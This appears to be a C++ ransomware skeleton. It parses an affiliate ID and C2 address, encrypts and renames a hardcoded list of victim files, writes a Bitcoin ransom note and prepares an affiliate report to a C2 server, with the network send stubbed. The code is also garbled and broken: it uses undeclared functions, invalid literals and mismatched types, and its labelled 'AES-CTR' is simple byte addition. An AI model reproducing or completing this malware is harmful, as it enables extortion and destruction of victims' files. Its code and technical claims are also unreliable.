#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <chrono>
#include <thread>
#include <fstream>

// Configuration Stub (Replace with actual logic)
struct Config {
    std::string affiliateId;
    std::string c2Address;
};

// Module Loading (Dynamic Import - Replace with proper DLL mechanism if needed)
void loadModule(const std::string& moduleName, std::vector<char>& moduleBytes) {
    // Simulate loading from a file or HTTP request
    // For simplicity, we'll just hardcode it here.
    if (moduleName == "Encryption") {
        moduleBytes = {"encryption.dll", 0x3C}; // Replace with actual bytes
    } else if (moduleName == "Communication") {
        moduleBytes = {"communication.dll", 0x48}; // Replace with actual bytes
    }
}

// Encryption using AES-CTR
void encryptFile(const std::string& filePath, std::vector<char>& encryptedBytes) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) {
        std::cerr << "Error opening file: " << filePath << std::endl;
        return;
    }

    // Get File Size and Offset
    inputFile.seekg(0);
    size_t fileSize = inputFile.tellg();
    inputFile.seekg(0);

    // Resize Encrypted Data
    encryptedBytes.resize(fileSize);

    // Fill in the Bytes using AES-CTR (using a random number generator)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 0xFF);

    char byte;
    size_t offset = 0;
    while (inputFile.read(&byte, sizeof(byte))) {
        encryptedBytes[offset] = encryptByte(byte, 48); // Key from Config
        offset++;

        if (offset >= 4) {
            encryptedBytes[offset] = encryptByte((byte & 0xFFFFFF), 5E);
            offset++;
        }
    }
}

// The Encryption Byte Function
unsigned char encryptByte(unsigned char val, unsigned char key) {
    return (val + key) & 0xFF;
}


int main() {
    std::cout << "Starting Ransomware...\n";

    // **1. Configuration Parsing**
    Config config;
    std::ifstream configFile("configuration.txt"); // Embedded File
    if (!configFile) {
        std::cerr << "Error opening configuration file!\n";
        return 1;
    }

    configFile >> config.affiliateId;
    configFile >> config.c2Address;

    // **2. Module Loading**
    std::vector<char> encryptionModuleBytes;
    loadModule("Encryption", encryptionModuleBytes);
    if (encryptionModuleBytes.empty()) {
        std::cerr << "Error loading Encryption module!\n";
        return 1;
    }

    std::vector<char> communicationModuleBytes;
    loadModule("Communication", communicationModuleBytes);
    if (communicationModuleBytes.empty()) {
        std::cerr << "Error loading Communication module!\n";
        return 1;
    }


    // **3. Victim Selection & File Encryption**
    std::vector<std::string> victimFiles = {"C:\\Windows\\System32\\notepad.exe", "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe", "C:\\Users\\Public\\Pictures\\Jaelynn_Wink_Measures_1564472701.jpg"};
    size_t victimFileCount = 0;

    // **3a. Encryption Logic**
    std::vector<char> encryptedData;
    for (const auto& file : victimFiles) {
        if (victimFileCount >= 5) break; // Limit to the top three for now

        encryptFile(file, encryptedData);
        // Rename File
        std::string newFileName = "Encrypted_" + file;
        if (rename(file.c_str(), newFileName.c_str()) == 0) {
            std::cout << "- " << file << " renamed to " << newFileName << std::endl;
        } else {
            std::cerr << "Error renaming file: " << file << std::endl;
            return 1;
        }
        victimFileCount++;
    }

    // **4. Ransom Note Creation & File Modification**
    std::ofstream ransomFile("ransom.txt", std::ios::binary);
    if (!ransomFile) {
        std::cerr << "Error opening ransom note file!\n";
        return 1;
    }
    ransomFile << "Your files have been encrypted!\n\nPay \$50 in Bitcoin to " << config.c2Address << "/" << config.affiliateId << " within 24 hours to unlock them.\n\nOr lose them forever!";

    ransomFile.close();


    // **5. Affiliate Reporting (Sending ID)**
    auto now = std::chrono::system_clock::now();
    unsigned long machineID = std::chrono::duration<long long>(now.time_since_epoch()).count() % 65536;
    std::string reportData = config.affiliateId + "|" + std::to_string(machineID);

    // Send Report (Replace with actual HTTP POST/DNS Flurry)
    std::cout << "Sending Report: " << reportData << " to C2...\n";
}
